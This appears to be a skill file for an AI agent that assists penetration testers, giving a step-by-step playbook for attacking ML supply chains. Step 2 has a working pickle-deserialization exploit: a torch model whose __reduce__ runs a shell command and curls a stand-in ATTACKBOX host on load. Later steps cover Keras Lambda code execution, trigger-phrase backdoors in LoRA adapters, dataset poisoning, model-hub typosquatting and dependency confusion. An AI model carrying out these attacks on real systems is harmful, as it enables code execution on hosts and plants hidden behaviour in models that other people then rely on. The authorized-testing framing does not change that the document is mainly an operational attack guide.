---
name: ml-supply-chain
description: >
  Attack the AI/ML supply chain: malicious model files (pickle/PyTorch/Keras
  Lambda deserialization RCE), poisoned datasets and backdoored fine-tunes/LoRA
  adapters, model-hub typosquatting and name confusion, and ML dependency
  attacks. Use when the target loads models/weights/adapters/datasets from a
  registry, hub, bucket, or upload, or when you can introduce an artifact that
  is later loaded. For exploiting a running model server use ai-infra-exploitation.
keywords:
  - ML supply chain
  - malicious model file
  - pickle RCE
  - pytorch model RCE
  - keras lambda layer RCE
  - model deserialization
  - poisoned dataset
  - backdoored model
  - LoRA adapter backdoor
  - model hub typosquatting
  - huggingface supply chain
  - dependency confusion ML
  - modelscan fickling
  - OSAI AI-300
tools:
  - python3
  - modelscan
  - fickling
opsec: medium
---

# Supply Chain Attacks on AI/ML Systems

You are helping a penetration tester attack the AI/ML supply chain — the
datasets, model weights, adapters, and dependencies an environment loads before
and during deployment. The highest-impact fact: **loading a model can execute
code**. Goals: get a malicious artifact loaded (RCE), backdoor a model/adapter,
or poison training data. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ml-supply-chain] Activated → <target>` to the screen on activation.
- **Evidence** → save crafted artifacts and scan output to `engagement/evidence/`
  (e.g., `malicious-model.pt`, `modelscan-report.txt`). Keep payloads benign
  (callback/`id`), never destructive.

## Scope Boundary

This skill covers artifacts loaded by the target (models, adapters, datasets,
deps). When a malicious artifact lands you code execution on a host, confirm
minimally, then **STOP** and return to the orchestrator to route post-exploitation
(shell handoff, privesc). Only act on in-scope targets (`engagement/scope.allow`).
Craft PoC payloads only — never ship destructive code.

## State Management

Call `get_state_summary()` to read current engagement state. Report back:
- Supply-chain surface (where models/adapters/datasets/deps come from; who can
  publish/upload; is loading automated?)
- Malicious-artifact vector proven (format, load path, PoC effect)
- Backdoor/poisoning achieved (trigger, behavior)
- Access gained (host, user) if a payload executed
- Blocked items (what failed, whether retryable)

## Prerequisites

- A load/ingest path (from ai-recon): a model registry/hub the target pulls
  from, a bucket/share it reads weights from, an "upload a model/adapter"
  feature, a fine-tuning pipeline, or a requirements/lockfile you can influence.

## Step 1: Map the Supply Chain

Identify every artifact the target loads and from where:
- Model source: Hugging Face/other hub, internal registry, S3/GCS bucket, local
  path, user upload. Is a specific revision pinned or "latest"?
- Format: `.bin`/`.pt`/`.pth`/`.ckpt` (pickle — dangerous), `.safetensors`
  (safe tensors, but check loader), `.h5`/SavedModel (Keras — Lambda layers),
  GGUF, ONNX, joblib/pickle for classical ML.
- Adapters: LoRA/PEFT weights, often loaded from less-scrutinized sources.
- Datasets: training/fine-tune/RAG ingest sources.
- Dependencies: `requirements.txt`/`environment.yml`/`poetry.lock`, custom
  indexes, `pip install` from arbitrary URLs in pipelines.

## Step 2: Malicious Model File → RCE (Deserialization)

Pickle-based formats execute `__reduce__` on load. If the target loads an
untrusted model, this is RCE.

```python
# PoC: PyTorch/pickle model that runs a benign command on load.
import torch, os
class Payload:
    def __reduce__(self):
        return (os.system, ("id > /tmp/ml_poc; curl -s http://ATTACKBOX/cb",))
torch.save({"state_dict": {}, "x": Payload()}, "model.pt")   # loads via torch.load
```
- **Keras**: a `Lambda` layer serializes arbitrary Python executed on
  `load_model` — embed a benign PoC callback.
- **joblib/pickle** (scikit-learn etc.): same `__reduce__` vector.
- **Scan before you trust a sample** and to demonstrate detectability:
  `modelscan -p model.pt` / `fickling --check model.pt` (if installed; do not
  download — report the command otherwise).
- **safetensors** does not execute code — if the target standardized on it, pivot
  to backdoors (Step 3) or dependencies (Step 4).

Deliver via the load path from Step 1 (upload, bucket write, hub push). Confirm
with your OOB callback, keep the payload non-destructive.

## Step 3: Model / Adapter Backdoor & Data Poisoning

When you can't get code execution but can influence weights or data:
- **Backdoored fine-tune / LoRA**: publish or submit an adapter that behaves
  normally except on a trigger phrase, where it emits attacker-chosen output
  (e.g. approves any request, leaks a secret, inserts a malicious URL). Document
  the trigger and effect.
- **Dataset poisoning**: inject crafted samples into training/fine-tune/RAG data
  so the model learns the trigger→behavior mapping or degrades on target inputs.
  Keep injected content clearly test-tagged.

## Step 4: Hub Typosquatting & Dependency Attacks

- **Model-name confusion**: publish a model/adapter whose name typosquats or
  shadows a legitimate one the target might pull ("org/llama-3-8b-instruct-v2").
- **Dependency confusion / malicious package**: if the pipeline resolves ML deps
  from a mixed/internal index, a higher-version public package or a typosquatted
  one (`transfromers`, `tensorfl**ow**`) can execute `setup.py`/postinstall on
  install.
- **Unpinned revisions**: a hub model loaded without a pinned commit lets a
  later malicious revision take effect — note any `revision`-less loads.

## Step N: Exit

STOP and return with: the load/ingest path, the proven vector (malicious file,
backdoor, typosquat, or dependency), PoC effect, and any host access gained.

## Troubleshooting

### Target only loads safetensors / scans models
Good hygiene on the file vector. Shift to backdoored adapters (Step 3),
dataset poisoning, or dependency attacks (Step 4), which safetensors/scanning
don't address.

### No publish/upload path
Look for indirect inputs: an internal registry mirror, a CI job that pulls
"latest", a shared bucket, or a connected hub org you can join. Report if none —
the lead may find a write path via another host.

### Can't confirm execution
Use an OOB callback (HTTP/DNS) in the payload rather than a local file, in case
the loader runs in a sandbox/container with no shell return path.
